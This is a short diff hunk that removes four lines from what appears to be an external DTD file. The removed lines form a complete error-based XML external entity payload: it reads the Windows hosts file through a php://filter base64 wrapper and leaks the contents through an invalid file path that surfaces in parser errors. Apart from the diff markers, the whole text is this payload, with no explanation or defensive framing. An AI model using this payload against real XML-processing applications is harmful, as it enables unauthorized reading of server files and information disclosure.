@@ -1,4 +1,0 @@
-<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///WINDOWS/system32/drivers/etc/hosts">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
-%eval;
-%exfil;
